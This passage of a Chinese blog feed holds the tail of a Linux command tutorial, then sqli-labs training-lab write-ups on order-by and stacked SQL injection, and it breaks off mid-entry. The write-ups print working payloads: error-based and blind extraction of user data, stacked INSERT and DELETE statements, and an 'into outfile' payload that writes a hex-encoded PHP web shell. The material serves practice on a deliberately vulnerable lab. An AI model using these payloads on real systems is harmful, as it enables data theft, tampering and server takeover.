+n</td><td>匹配修改文件权限的时间（-n指n天以内，+n指n天以前）</td></tr><tr><td>-nouser</td><td>匹配无所有者的文件</td></tr><tr><td>-nogroup</td><td>匹配无所有组的文件</td></tr><tr><td>-newer f1 !f2</td><td>匹配比文件f1新但比f2旧的文件</td></tr><tr><td>-type b&#x2F;d&#x2F;c&#x2F;p&#x2F;l&#x2F;f</td><td>匹配文件类型（后面的字幕字母依次表示块设备、目录、字符设备、管道、链接文件、文本文件）</td></tr><tr><td>-size</td><td>匹配文件的大小（+50KB为查找超过50KB的文件，而-50KB为查找小于50KB的文件）</td></tr><tr><td>-prune</td><td>忽略某个目录</td></tr><tr><td>-exec …… {};</td><td>后面可跟用于进一步处理搜索结果的命令（下文会有演示）</td></tr></tbody></table><p>这里说明一下 -exec 参数的作用,这个参数用于把find命令搜索到的结果交由紧随其后的命令做进一步处理.他类似于管道符</p><p>linux系统中的配置文件都会保存到&#x2F;etc目录 如果想要获取改目录中所有以host开头的文件列表</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191209422.png" alt="image-20220319120912380"></p><p>如果要在整个系统中搜索权限中包括suid权限的所有文件,只需要使用-4000</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191210483.png" alt="image-20220319121024441"></p><h4 id="locate命令"><a href="#locate命令" class="headerlink" title="locate命令"></a>locate命令</h4><p>locate命令用于按照命令快速搜索文件所对应的位置,语法格式为 locate文件名称</p><p>使用find命令进行全麻搜索虽然更准确,但是效率有点低.如果是仅仅想找一些常见的而且又知道大概名称的文件,不如试试locate命令.在使用locate命令时,先使用updatedb命令生成一个索引库文件,这个库文件的名称是&#x2F;var&#x2F;lib&#x2F;mlocate&#x2F;mlocate.db,后续在使用locate命令搜索文件时就是在该库中进行查找操作,速度会快很多</p><p>第一次使用locate命令之前,记得先执行updatedb命令来生成索引数据库在进行查找</p><h4 id="whereis命令"><a href="#whereis命令" class="headerlink" title="whereis命令"></a>whereis命令</h4><p>whereis命令用于按照名称快速搜索二进制程序(命令),源代码以及帮助文件对应的位置,语法格式</p><pre><code>whereis 命令名称</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203191218551.png" alt="image-20220319121816516"></p><h3 id="文本文件编辑命令"><a href="#文本文件编辑命令" class="headerlink" title="文本文件编辑命令"></a>文本文件编辑命令</h3><h4 id="cat命令"><a href="#cat命令" class="headerlink" title="cat命令"></a>cat命令</h4><p>cat命令用于查看纯文本文件(内容较少的),英文全称为 concatenate 语法</p><pre><code> cat [参数] 文件名称</code></pre><p>linux系统中有多个用于查看文本内容的命令,每个命令都有自己的特点</p><p>如果想要在查看内容的同时显示行号的话,在cat命令后面加一个-n参数</p><h4 id="more命令"><a href="#more命令" class="headerlink" title="more命令"></a>more命令</h4><p>more命令用于查看纯文本文件</p><pre><code>more [参数] 文件名称</code></pre><h4 id="head命令"><a href="#head命令" class="headerlink" title="head命令"></a>head命令</h4><p>head命令用于查看纯文本文件的前n行,语法</p><pre><code>head [参数] 文件名称</code></pre><h4 id="tail命令"><a href="#tail命令" class="headerlink" title="tail命令"></a>tail命令</h4><p>tail命令用于查看纯文本文件的后n行或者持续刷新的文件的最新的内容,语法</p><pre><code>tail [参数] 文件名称</code></pre><p>我们还可能遇到另一种情况,比如要查看文本内容的最后十行,这个时候就需要用到tail命令的操作方法与head命令相似</p><p>tail命令还能够持续刷新一个文件的内容,当想要实时查看最新的日志文件的时候,这特别有用,此时的命令格式为</p><pre><code> tail -f 文件名称</code></pre><h4 id="tr命令"><a href="#tr命令" class="headerlink" title="tr命令"></a>tr命令</h4><p>tr命令用于替换文本内容中的字符,英文全称为 transform 语法</p><pre><code>tr [原始字符] [目标字符]</code></pre><p>在很多时候，我们想要快速地替换文本中的一些词汇，又或者想把整个文本内容都进行替换。如果进行手工替换，难免工作量太大，尤其是需要处理大批量的内容时，进行手工替换更是不现实。这时，就可以先使用cat命令读取待处理的文本，然后通过管道符把这些文本内容传递给tr命令进行替换操作即可。例如，把某个文本内容中的英文全部替换为大写</p><pre><code>cat anaconda-ks.cfg | tr [a-z] [A-Z]</code></pre><h4 id="wc命令"><a href="#wc命令" class="headerlink" title="wc命令"></a>wc命令</h4><p>wc命令用于统计指定文本文件的行数 字数或字节数 word counts 语法</p><pre><code>wc [参数] 文件名称</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211216963.png" alt="image-20220321121628917"></p><h4 id="stat命令"><a href="#stat命令" class="headerlink" title="stat命令"></a>stat命令</h4><p>stat命令用于查看文件的具体存储细节和时间等信息,英文全称为 status</p><pre><code>stat [文件名称]</code></pre><p>文件有一个修改时间,Access Time 内容最后一次被访问的时间,Modigy Time 内容最后一次被修改的时间,简称为Mtime,以及Change Time 文件属性最后一次被修改时间</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211220442.png" alt="image-20220321122012402"></p><h4 id="grep命令"><a href="#grep命令" class="headerlink" title="grep命令"></a>grep命令</h4><p>grep命令用于按行提取文本内容,语法格式为</p><pre><code>grep [参数] 文件名称</code></pre><p>grep命令时用途最广泛的文本搜索匹配工具,grep最常用的两个参数</p><pre><code>-n     用来显示搜索到的信息的行号-v    参数用于反选信息</code></pre><p> grep命令中的参数及其作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-b</td><td>将可执行文件(binary)当作文本文件（text）来搜索</td></tr><tr><td>-c</td><td>仅显示找到的行数</td></tr><tr><td>-i</td><td>忽略大小写</td></tr><tr><td>-n</td><td>显示行号</td></tr><tr><td>-v</td><td>反向选择——仅列出没有“关键词”的行。</td></tr></tbody></table><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211224730.png" alt="image-20220321122415687"></p><h4 id="cut命令"><a href="#cut命令" class="headerlink" title="cut命令"></a>cut命令</h4><p>cut命令用于按列提取文本内容,语法格式为</p><pre><code>cut [参数] 文件名称</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211225315.png" alt="image-20220321122550279"></p><h4 id="diff命令"><a href="#diff命令" class="headerlink" title="diff命令"></a>diff命令</h4><p>diff命令用于比较多个文件之间的内容的差异,英文是 different 语法</p><pre><code>diff [参数] 文件名称A 文件名称B</code></pre><p>使用diff命令时,不经可以使用 –brief 参数来确定两个文件是否相同,还可以使用 -c 参数来详细比较出多个文件的差异之处</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211228862.png" alt="image-20220321122852823"></p><h4 id="uniq命令"><a href="#uniq命令" class="headerlink" title="uniq命令"></a>uniq命令</h4><p>uniq命令用于去除文本中连续的重复行,英文 unique 语法</p><pre><code>uniq [参数] 文件名称</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211230207.png" alt="image-20220321123022170"></p><h4 id="sort命令"><a href="#sort命令" class="headerlink" title="sort命令"></a>sort命令</h4><p>sort命令用于对文本内容进行在排序,语法格式</p><pre><code>sort [参数] 文件名称</code></pre><p> sort命令中的参数及其作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-f</td><td>忽略大小写</td></tr><tr><td>-b</td><td>忽略缩进与空格</td></tr><tr><td>-n</td><td>以数值型排序</td></tr><tr><td>-r</td><td>反向排序</td></tr><tr><td>-u</td><td>去除重复行</td></tr><tr><td>-t</td><td>指定间隔符</td></tr><tr><td>-k</td><td>设置字段范围</td></tr></tbody></table><h3 id="文件目录管理命令"><a href="#文件目录管理命令" class="headerlink" title="文件目录管理命令"></a>文件目录管理命令</h3><h4 id="touch命令"><a href="#touch命令" class="headerlink" title="touch命令"></a>touch命令</h4><p>touch命令用于创建空白文件或设置文件的时间,语法</p><pre><code>touch [参数] 文件名称</code></pre><p>在创建空白的文本文件方面,这个touch命令相当简洁</p><p>touch命令中的参数及其作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-a</td><td>仅修改“读取时间”（atime）</td></tr><tr><td>-m</td><td>仅修改“修改时间”（mtime）</td></tr><tr><td>-d</td><td>同时修改atime与mtime</td></tr></tbody></table><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211234503.png" alt="image-20220321123429462"></p><h4 id="mkdir-命令"><a href="#mkdir-命令" class="headerlink" title="mkdir 命令"></a>mkdir 命令</h4><p>mkdir命令用于创建空白的目录, 英文 make directory 语法</p><pre><code>mkdir [参数] 目录名称</code></pre><p>除了能创建单个空白目录,mkdir命令还可以结合-p参数来递归创建出具有嵌套层叠关系的文件目录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211235312.png" alt="image-20220321123549266"></p><h4 id="cp命令"><a href="#cp命令" class="headerlink" title="cp命令"></a>cp命令</h4><p>cp命令用于复制文件或目录,英文copy,语法</p><pre><code>cp [参数] 源文件名称 目标文件名称</code></pre><p>复制的操作有三种情况</p><ul><li>如果目标文件是目录,则会把源文件复制到该目录中</li><li>如果目标文件也是普通文件,则会询问是否要覆盖他</li><li>如果目标文件不存在,则执行正常的复制操作</li></ul><p>要记住复制目录时要加上-r参数</p><p> cp命令中的参数及其作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-p</td><td>保留原始文件的属性</td></tr><tr><td>-d</td><td>若对象为“链接文件”，则保留该“链接文件”的属性</td></tr><tr><td>-r</td><td>递归持续复制（用于目录）</td></tr><tr><td>-i</td><td>若目标文件存在则询问是否覆盖</td></tr><tr><td>-a</td><td>相当于-pdr（p、d、r为上述参数）</td></tr></tbody></table><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211240960.png" alt="image-20220321124038914"></p><h4 id="mv命令"><a href="#mv命令" class="headerlink" title="mv命令"></a>mv命令</h4><p>mv命令用于剪切或者重命名文件,英文全称为 move 语法</p><pre><code>mv [参数] 源文件名称 目标文件名称</code></pre><p>剪切操作不同于复制操作,因为它默认会把源文件删除,只保留剪切后的文件.如果在同一个目录中将某个文件剪切后还粘贴到当前的目录下面,其实就是对该文件的重命名操作</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211243172.png" alt="image-20220321124355135"></p><p>rm命令</p><p>rm命令用于删除文件或者目录,英文全称为 remove 语法</p><pre><code>rm [参数] 文件 名称</code></pre><p>linux系统中删除文件是,系统会默认向您询问是否要执行删除操作,如果不想总是看见这种反复的确认信息,可以在rm命令后跟上 -f 参数来强制删除,另外想要删除一个目录,需要在rm命令后面加上一个-r参数才可以,否则删除不掉</p><p>rm命令中的参数及其作用</p><table><thead><tr><th>参数</th><th align="left">作用</th></tr></thead><tbody><tr><td>-f</td><td align="left">强制执行</td></tr><tr><td>-i</td><td align="left">删除前询问</td></tr><tr><td>-r</td><td align="left">删除目录</td></tr><tr><td>-v</td><td align="left">显示过程</td></tr></tbody></table><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211248722.png" alt="image-20220321124800674"></p><h4 id="dd命令"><a href="#dd命令" class="headerlink" title="dd命令"></a>dd命令</h4><p>dd命令用于按照指定大小和个数的数据块来复制文件或者转换文件,语法</p><pre><code>dd if=参数值 of=参数值 count=参数值 bs=参数值</code></pre><p>  dd命令中的参数及其作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>if</td><td>输入的文件名称</td></tr><tr><td>of</td><td>输出的文件名称</td></tr><tr><td>bs</td><td>设置每个“块”的大小</td></tr><tr><td>count</td><td>设置要复制“块”的个数</td></tr></tbody></table><h4 id="file命令"><a href="#file命令" class="headerlink" title="file命令"></a>file命令</h4><p>file命令用于查看文件的类型,语法</p><pre><code>file 文件名称</code></pre><p>在linux中,由于文本,目录,设备等所有这些一切都有统称为文件,但是他们不像win系统哪有带有后缀,因此难以通过文件名一眼看出具体的文件类型.这个时候就需要file命令来查看文件类型了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211253546.png" alt="image-20220321125355500"></p><p>在win系统中打开文件时,一般都是通过用户双击鼠标来完成的,系统会自动判断用户双击的文件是什么类型,因此需要有后缀进行区别,而linux系统则是根据用户执行的命令来调用文件,例如执行cat命令查看文本,执行bash命令执行脚本等,所以也就不需要强制让用户给文件设置后缀了</p><h4 id="tar命令"><a href="#tar命令" class="headerlink" title="tar命令"></a>tar命令</h4><p>tar命令用于对文件进行打包压缩或者解压语法</p><pre><code>tar 参数 文件名称</code></pre><p>在网络上,人们越来越倾向于传输压缩格式的文件,原因是压缩文件的体积小,在网速相同的情况下,体积越小则传输的时间越短.在linux系统只不过,主要使用.tar .tar.gz 或者 .tar.bz2格式,这些格式大部分都是用tar命令生成的</p><p> tar命令中的参数及其作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-c</td><td>创建压缩文件</td></tr><tr><td>-x</td><td>解开压缩文件</td></tr><tr><td>-t</td><td>查看压缩包内有哪些文件</td></tr><tr><td>-z</td><td>用Gzip压缩或解压</td></tr><tr><td>-j</td><td>用bzip2压缩或解压</td></tr><tr><td>-v</td><td>显示压缩或解压的过程</td></tr><tr><td>-f</td><td>目标文件名</td></tr><tr><td>-p</td><td>保留原始的权限与属性</td></tr><tr><td>-P</td><td>使用绝对路径来压缩</td></tr><tr><td>-C</td><td>指定解压到的目录</td></tr></tbody></table><p>首先 -c 参数用于创建压缩文件, -x 参数用于解压文件 因此这两个参数不能同时使用, 其次, -z 参数指定使用 gzip 的格式来压缩或者解压文件 -j 参数指定使用bzip2格式来压缩或者解压问价.用户使用时则是根据文件的后缀来决定使用那种格式的参数来进行解压.在执行某些压缩或者解压缩操作时,可能需要花费数个小时,如果屏幕一直没有输出,您不好判断打包的进度情况,因此可以使用 -v 参数向用户不断显示压缩或者解压缩的过程 -C 参数用于指定要解压到那个指定的目录 -f 参数很重要,他必须放在参数的最后一位,代表要压缩或者解压缩的软件包的名称 </p><pre><code>压缩    tar -czvf 压缩包名称.tar.gz 要打包的目录解压    tar -xzvf 压缩包名称.tar.gz </code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211307467.png" alt="image-20220321130716412"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203211315337.png" alt="image-20220321131538289"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlilabs靶场记录排序注入(九)</title>
      <link href="/ctf/sql/sql-sqlilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%E6%8E%92%E5%BA%8F%E6%B3%A8%E5%85%A5(%E4%B9%9D)/"/>
      <url>/ctf/sql/sql-sqlilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%E6%8E%92%E5%BA%8F%E6%B3%A8%E5%85%A5(%E4%B9%9D)/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlilabs靶场记录排序注入-九"><a href="#sqlilabs靶场记录排序注入-九" class="headerlink" title="sqlilabs靶场记录排序注入(九)"></a>sqlilabs靶场记录排序注入(九)</h1><h2 id="less-46基于错误GET数字型排序注入"><a href="#less-46基于错误GET数字型排序注入" class="headerlink" title="less-46基于错误GET数字型排序注入"></a>less-46基于错误GET数字型排序注入</h2><p>这一关首先要说一下的是，在前面的关卡中我们大多是使用 id这个参数来获取到正常的页面，但在这几关中我们要使用 sort 这个参数</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181936533.png" alt="image-20220318193618446"></p><p>我们看到了正常的页面，从中我们也发现了数字的不同，页面给我们呈现出的账号表格中的顺序是不同的，那么这就是我们这几关要说的知识点。</p><pre><code>这关往后都是order by语句与limit语句的相关注入，还是很实用的，尤其是对于一些会显示表格的网站，他们的 URL 中通常都会有sort和limit两个参数。</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181937263.png" alt="image-20220318193754203"></p><p>从中我们了解到通过sort参数接受需要排序的列的序号</p><pre><code>尝试sort asc 和sort=1 desc 分别显示升序和降序的表格,说明次数是注入点,即注入点在order by后面的参数中.而order by不同于在where后的注入,不能使用union等进行注入.</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181944162.png" alt="image-20220318194402093"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181944322.png" alt="image-20220318194417266"></p><p>order by后的数字可以作为一个注入点.也就是构造order by 后的一个语句,让改语句执行结果为一个数,我们尝试:</p><pre><code>left(version(),1)    right(version(),1)</code></pre><p>没有报错，但是 right 换成 left 都一样，说明数字没有起作用</p><p>仔细考虑一下,就会发现这里的字段数目是一定的,也就是说明这里的字段数最大就是3.那么我们当然不能使用超过3以上的数字来进行判断了</p><p>但是这里我们可以使用布尔类型,报错注入,时间盲注</p><p><strong>基于报错</strong></p><pre><code>爆库:(select 1 from (select count(*),concat_ws(&#39;-&#39;,(select database()),floor(rand()*2))as a from information_schema.tables group by a) b)爆表:(select 1 from (select count(*),concat_ws(&#39;-&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),floor(rand()*2))as a from information_schema.tables group by a) b)或者:(select 1 from (select count(*),concat_ws(&#39;-&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),floor(rand()*2))as a from information_schema.tables group by a) b)字段名:(select 1 from (select count(*),concat_ws(&#39;-&#39;,(select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 1,1),floor(rand(0)*2))as a from information_schema.tables group by a) b)爆数据:(select 1 from (select count(*),concat_ws(&#39;-&#39;,(select concat_ws(&#39;-&#39;,id,username,password) from users limit 0,1),floor(rand(0)*2))as a from information_schema.tables group by a) b)</code></pre><p><strong>延时注入</strong></p><pre><code>if(ascii(mid(database(),1,1))=115,sleep(3),0) </code></pre><p><strong>布尔盲注</strong></p><pre><code>rand(ascii(left(database(),1))=115)    正确的</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181957928.png" alt="image-20220318195733861"></p><pre><code>rand(ascii(left(database(),1))=116)    错误的</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181957876.png" alt="image-20220318195750814"></p><p><strong>procedure analyse 参数后注入</strong></p><p>利用 procedure analyse 参数，我们可以执行报错注入。同时，在 procedure analyse 和 order by 之间可以存在 limit 参数，我们在实际应用中，往往也可能会存在 limit 后的注入，可以利用 procedure analyse 进行注入</p><pre><code>1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203182001373.png" alt="image-20220318200133309"></p><p><strong>导出文件 into outfile 参数注入</strong></p><pre><code>1 into outfile &quot;D:\\Data\\secquan\\tools\\Environment\\PhpStudy\\PHPTutorial\\WWW\\sqlilabs\\Less-46\\test.txt&quot;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203182003172.png" alt="image-20220318200343101"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203182004404.png" alt="image-20220318200411347"></p><pre><code>1 into outfile &quot;D:\\Data\\secquan\\tools\\Environment\\PhpStudy\\PHPTutorial\\WWW\\sqlilabs\\Less-46\\test.php&quot; lines terminated by 0x3c3f706870206576616c28245f504f53545b227a66225d293b3f3e其中lines terminates by将每行以指定字符串结尾：    0x3c3f706870206576616c28245f504f53545b227a66225d293b3f3e = hex(&lt;?php eval($_POST[&quot;zf&quot;]);?&gt;)</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203182006598.png" alt="image-20220318200654533"></p><h2 id="Less-47基于错误GET字符型单引号排序注入"><a href="#Less-47基于错误GET字符型单引号排序注入" class="headerlink" title="Less-47基于错误GET字符型单引号排序注入"></a>Less-47基于错误GET字符型单引号排序注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203182013086.png" alt="image-20220318201308014"></p><p>将 id 变为字符型，因此根据我们上述提到的知识，我们依旧按照注入的位置进行分类。(不过这里还要说一点的是在Less-46关中，我们没有用注释符是因为他是数字型，且注入的位置在SQL语句末尾，而字符型就必须要注释了，否则无法进行单引号的正常闭合)</p><p><strong>基于报错注入</strong></p><pre><code>1&#39; and (select 1 from (select count(*),concat_ws(&#39;-&#39;,(select database()),floor(rand()*2))as a from information_schema.tables group by a) b)--+</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203182014049.png" alt="image-20220318201401990"></p><p><strong>基于 Time 盲注</strong></p><pre><code>1&#39; and if(ascii(mid(database(),1,1))=115,1,sleep(0.3))--+</code></pre><h2 id="less-48基于盲注GET数字型排序注入"><a href="#less-48基于盲注GET数字型排序注入" class="headerlink" title="less-48基于盲注GET数字型排序注入"></a>less-48基于盲注GET数字型排序注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203182019088.png" alt="image-20220318201958023"></p><p>与 less-46 的区别在于报错注入不能使用，不进行错误回显，因此其他的方法我们依旧是可以使用的</p><h2 id="Less-49基于盲注GET字符型单引号排序注入"><a href="#Less-49基于盲注GET字符型单引号排序注入" class="headerlink" title="Less-49基于盲注GET字符型单引号排序注入"></a>Less-49基于盲注GET字符型单引号排序注入</h2><p>与 47 关基本类似，区别在于没有错误回显，所以我们可以通过延时注入和导入文件进<br>行注入</p><p><strong>基于 Time 盲注</strong></p><pre><code>1&#39; and if(ascii(mid(database(),1,1))=115,1,sleep(1))--+</code></pre><h2 id="Less-50基于错误GET数字型排序堆叠注入"><a href="#Less-50基于错误GET数字型排序堆叠注入" class="headerlink" title="Less-50基于错误GET数字型排序堆叠注入"></a>Less-50基于错误GET数字型排序堆叠注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203182054403.png" alt="image-20220318205427348"></p><p>我们从源码可以看到，一般后台查询数据库使用的语句都是mysql_query()，而可以堆叠注入的后台使用的是mysqli_multi_query()。（这个函数是能否进行堆叠注入的关键）</p><p>排序注入在这一关通用</p><pre><code>(select 1 from (select count(*),concat_ws(&#39;-&#39;,(select database()),floor(rand()*2))as a from information_schema.tables group by a) b)1 and (updatexml(1,concat(0x7e,(select database())),0)) </code></pre><p>堆叠注入的方法也同样适用这一关</p><pre><code>1;insert into users(id,username,password) values(50,&#39;Less50&#39;,&#39;Less50&#39;)--+</code></pre><h2 id="Less-51基于错误GET字符型单引号排序堆叠注入"><a href="#Less-51基于错误GET字符型单引号排序堆叠注入" class="headerlink" title="Less-51基于错误GET字符型单引号排序堆叠注入"></a>Less-51基于错误GET字符型单引号排序堆叠注入</h2><p>和Less-50的操作基本一样，只要注意单引号的闭合和注释符就可以了</p><pre><code>1&#39; and (select 1 from (select count(*),concat_ws(&#39;-&#39;,(select database()),floor(rand()*2))as a from information_schema.tables group by a) b)--+1&#39;;insert into users values(51,&#39;Less51&#39;,&#39;Less51&#39;)--+</code></pre><h2 id="Less-52基于Bool-GET数字型盲注堆叠注入"><a href="#Less-52基于Bool-GET数字型盲注堆叠注入" class="headerlink" title="Less-52基于Bool_GET数字型盲注堆叠注入"></a>Less-52基于Bool_GET数字型盲注堆叠注入</h2><p>Less-50 是一样的，只是这里的 mysql 错误不会在前台显示，但是对于 stacked injection 是  一样的利用方式，当然布尔盲注，延时注入都可以参考Less-46，这里只演示堆叠注入</p><pre><code>1;insert into users(id,username,password) values(52,&#39;Less52&#39;,&#39;Less52&#39;)--+</code></pre><h2 id="Less-53基于Bool-GET单引号字符型盲注堆叠注入"><a href="#Less-53基于Bool-GET单引号字符型盲注堆叠注入" class="headerlink" title="Less-53基于Bool_GET单引号字符型盲注堆叠注入"></a>Less-53基于Bool_GET单引号字符型盲注堆叠注入</h2><p> Less-51 是一样的，只是这里的 mysql 错误不会在前台显示，但是对于 stacked injection 是  一样的利用方式</p><pre><code>1&#39;;insert into users(id,username,password) values(53,&#39;Less53&#39;,&#39;Less53&#39;)--+</code></pre><h2 id="接下来的关卡就是挑战关了-回头再玩"><a href="#接下来的关卡就是挑战关了-回头再玩" class="headerlink" title="接下来的关卡就是挑战关了(回头再玩)"></a>接下来的关卡就是挑战关了(回头再玩)</h2>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>slqilabs靶场记录堆叠注入(八)</title>
      <link href="/ctf/sql/sel-slqilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5(%E5%85%AB)/"/>
      <url>/ctf/sql/sel-slqilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5(%E5%85%AB)/</url>
      
        <content type="html"><![CDATA[<h1 id="slqilabs靶场记录堆叠注入-八"><a href="#slqilabs靶场记录堆叠注入-八" class="headerlink" title="slqilabs靶场记录堆叠注入(八)"></a>slqilabs靶场记录堆叠注入(八)</h1><h2 id="Stacked-injections-堆叠注入"><a href="#Stacked-injections-堆叠注入" class="headerlink" title="Stacked injections-堆叠注入"></a>Stacked injections-堆叠注入</h2><p>从字面意思上来看就是一堆的sql语句一起执行.而在真实的运用中也是这样的,我们知道在mysql中,主要是在命令行中,每一条语句的结尾加;表示语句的结束.这样我们就想到了是不是可以多句一起使用.这个就叫stacked injection.</p><h3 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h3><p>在sql中,分号;是用来表示一条sql语句的结束,试着想一下我们在;结束一个sql语句之后继续构造下一条语句,会不会一起执行?因为这个想法也就造成了堆叠注入.而union injection(联合注入)也是将两条语句合并在一起,两者之间有什么区别吗?区别就在于union或者union all执行的语句类型是有限的,可以用来执行查询语句,而堆叠注入可以执行的是任意的语句.</p><pre><code>户输入:1;delete from products服务器端产生的sql语句为:(因没有对输入的参数进行过滤)select * from products where productid=1;delete from products当执行查询后,第一条显示查询信息,第二条则将整个表进行删除</code></pre><h3 id="堆叠注入的局限性"><a href="#堆叠注入的局限性" class="headerlink" title="堆叠注入的局限性"></a>堆叠注入的局限性</h3><p>堆叠注入的局限性在于并不是每一个环境都可以执行,可能收到api或者数据库引擎不支持的限制,当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序</p><p>在我们的web系统中,因为代码通常只返回一个查询结果,因此,堆叠注入的第二个语句产生错或者结果只能被忽略,我们在前端界面是无法看到返回的结果的.因此,在读取数据时,我们建议使用union(联合)注入.同时在使用堆叠注入之前.我们也是需要知道一些数据库的相关信息的.</p><h2 id="less-38基于错误GET单引号字符型堆叠注入"><a href="#less-38基于错误GET单引号字符型堆叠注入" class="headerlink" title="less-38基于错误GET单引号字符型堆叠注入"></a>less-38基于错误GET单引号字符型堆叠注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181854531.png" alt="image-20220318185437441"></p><p>mysqli_multi_query()函数执行一个或多个针对数据库的查询.多个查询用分号进行分割.(有这个才能进行堆叠)分号我们可以加入新的语句</p><p>堆叠注入需要依靠前文所写的注入方式来获取数据库的信息(因为源代码没有进行任何过滤，还爆数据库错误信息，是最简单的SQL注入)，在这里只演示如何插入新的数据。</p><pre><code>1&#39;;insert into users(id,username,password) values(38,&#39;wanan&#39;,&#39;1&#39;)--+</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181904566.png" alt="image-20220318190414507"></p><p>可以发现语句已经写进去了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181905984.png" alt="image-20220318190544914"></p><pre><code>PHP mysqli_multi_query() 函数mysqli_multi_query() 函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。一、mysql与mysqli的概念相关：1、mysql与mysqli都是php方面的函数集，与mysql数据库关联不大2、在php5版本之前，一般是用php的mysql函数去驱动mysql数据库的，比如mysql_query()的函数，属于面向过程3、在php5版本以后，增加了mysqli的函数功能，某种意义上讲，它是mysql系统函数的增强版，更稳定更高效更安全，与mysql_query()对应的有mysqli_query()，属于面向对象，用对象的方式操作驱动mysql数据库。mysqli有两种方式：一种是面对对象的，一种是面向过程的。二、mysql与mysqli的区别：1、mysql是非持继连接函数，mysql每次链接都会打开一个连接的进程。2、mysqli是永远连接函数，mysqli多次运行mysqli将使用同一连接进程,从而减少了服务器的开销。mysqli封装了诸如事务等一些高级操作，同时封装了DB操作过程中的很多可用的方法。</code></pre><h2 id="less-39基于错误GET数字型堆叠注入"><a href="#less-39基于错误GET数字型堆叠注入" class="headerlink" title="less-39基于错误GET数字型堆叠注入"></a>less-39基于错误GET数字型堆叠注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181911928.png" alt="image-20220318191134842"></p><p>数字型注入</p><pre><code>?id=1;insert into users(id,username,password) values(39,&#39;less39&#39;,&#39;hello&#39;)--+</code></pre><h2 id="less-40基于BoolGET单引号小括号字符型盲注堆叠注入"><a href="#less-40基于BoolGET单引号小括号字符型盲注堆叠注入" class="headerlink" title="less-40基于BoolGET单引号小括号字符型盲注堆叠注入"></a>less-40基于BoolGET单引号小括号字符型盲注堆叠注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181912928.png" alt="image-20220318191238843"></p><pre><code>?id=1&#39;);insert into users values(40,&#39;Less40&#39;,&#39;hello&#39;)--+</code></pre><h2 id="less-41基于BoolGET数字型盲注堆叠注入"><a href="#less-41基于BoolGET数字型盲注堆叠注入" class="headerlink" 